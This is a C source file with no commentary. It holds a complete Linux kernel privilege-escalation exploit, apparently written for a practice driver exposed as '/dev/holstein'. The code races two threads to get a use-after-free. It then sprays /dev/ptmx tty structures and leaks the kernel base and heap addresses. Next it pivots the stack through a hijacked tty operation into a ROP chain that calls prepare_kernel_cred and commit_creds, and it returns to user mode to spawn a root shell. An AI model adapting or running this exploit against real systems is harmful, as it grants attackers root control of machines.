#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <pthread.h>
#include <string.h>

//0xffffffff81137da8: push rdx; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret;
//0xffffffff810d5ba9: push rcx; or al, 0; add byte ptr [rax + 0xf], cl; mov edi, 0x8d480243; pop rsp; re
//0xffffffff810b13c5: pop rdi; ret;
//ffffffff81072580 T prepare_kernel_cred
//ffffffff810723e0 T commit_creds
//0xffffffff8165094b: mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; ret; 
//0xffffffff81c6bfe0: pop rcx; ret; 
//ffffffff81800e10 T swapgs_restore_regs_and_return_to_usermode
//0xffffffff810012b0: pop rcx; pop rdx; pop rsi; pop rdi; pop rbp; ret;

#define push_rdx_pop_rsp 0x137da8
#define pop_rdi_ret 0xb13c5
#define prepare_kernel_cred 0x72580
#define commit_creds 0x723e0
#define pop_rcx_ret 0xc6bfe0
#define mov_rdi_rax 0x65094b
#define swapgs_restore 0x800e10
#define pop_rcx_5 0x12b0

unsigned long user_cs, user_sp, user_ss, user_rflags;



void backdoor()
{
	printf("****getshell****");
	system("id");
	system("/bin/sh");
}

void save_user_land()
{
	__asm__(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[*] Saved userland registers");
	printf("[#] cs: 0x%lx \n", user_cs);
	printf("[#] ss: 0x%lx \n", user_ss);
	printf("[#] rsp: 0x%lx \n", user_sp);
	printf("[#] rflags: 0x%lx \n", user_rflags);
	printf("[#] backdoor: 0x%lx \n\n", backdoor);
}

int success = 0;
void *thread_function(void *arg) {
	while(1)
	{
		while (!success)
		{
			int fd = open("/dev/holstein",O_RDWR);
			if (fd == 4)
				success = 1;
			if (fd != -1 && success == 0)
				close(fd);
		}
		if (write(3, "a", 1) != 1 || write(4, "a", 1) != 1)
		{
			close(3);
			close(4);
			success = 0;
		} 
		else
			break;
	}
	
}
int main()
{
	pthread_t thread_id1, thread_id2;
	int spray[200];
	save_user_land();
	if (pthread_create(&thread_id1, NULL, thread_function, NULL) != 0)
	{
		fprintf(stderr, "thread error\n");
		return 1;
	}
	if (pthread_create(&thread_id2, NULL, thread_function, NULL) != 0)
	{
		fprintf(stderr, "thread error\n");
		return 1;
	}
	pthread_join(thread_id1, NULL);
	pthread_join(thread_id2, NULL);	
	char temp[0x20]= {};
	write(3, "abcdefg", 7);
	read(4, temp, 7);
	printf("temp:%s\n", temp);
	if (strcmp(temp, "abcdefg"))
	{
		puts("failure\n");
		exit(-1);
	}
	if (!strcmp(temp,"abcdefg"))
	{
		printf("sucess\n");
		close(4);
		for (int i = 0; i < 50; i++)
		{
			spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
			if (spray[i] == -1)
			{
				printf("error!\n");
				exit(-1);
			}
		}
		char buf[0x400];
		read(3, buf, 0x400);
		unsigned long *p = (unsigned long *)&buf;
		for (unsigned int i = 0; i < 0x80; i++)
			printf("[%x]:addr:0x%lx\n",i,p[i]);
		unsigned long kernel_address = p[3];
		unsigned long heap_address = p[7];
		if ((kernel_address >> 32) != 0xffffffff)
		{
			printf("leak error!\n");
			exit(-1);	
		}
		else
			printf("leak 	sucess\n");
		unsigned long kernel_base = kernel_address - 0xc3afe0;
		unsigned long g_buf = heap_address - 0x38;
		printf("kernel_base:0x%lx\ng_buf:0x%lx\n", kernel_base, g_buf);
		//getchar();	
		*(unsigned long *)&buf[0x18] = g_buf;
		p[0xc] = push_rdx_pop_rsp + kernel_base;
		//for (unsigned long i = 0xd; i < 0x80; i++)
		//	p[i] = g_buf + i;
		int index = 0x21;
		p[index++] = pop_rdi_ret + kernel_base;
		p[index++] = 0;
		p[index++] = prepare_kernel_cred + kernel_base;
		p[index++] = pop_rcx_5 + kernel_base;
		p[index++] = 0;
		p[index++] = 0;
		p[index++] = 0;
		p[index++] = 0;
		p[index++] = 0;
		p[index++] = mov_rdi_rax + kernel_base;
		p[index++] = commit_creds + kernel_base;
		p[index++] = swapgs_restore + kernel_base + 22;
		p[index++] = 0;
		p[index++] = 0;
		p[index++] = (unsigned long)backdoor;
    		p[index++] = user_cs;
    		p[index++] = user_rflags;
    		p[index++] = user_sp;
    		p[index++] = user_ss;  		
		write(3, buf, 0x400);	
		ioctl(4, 0, g_buf + 0x100); 		
	}
	return 0;	
}
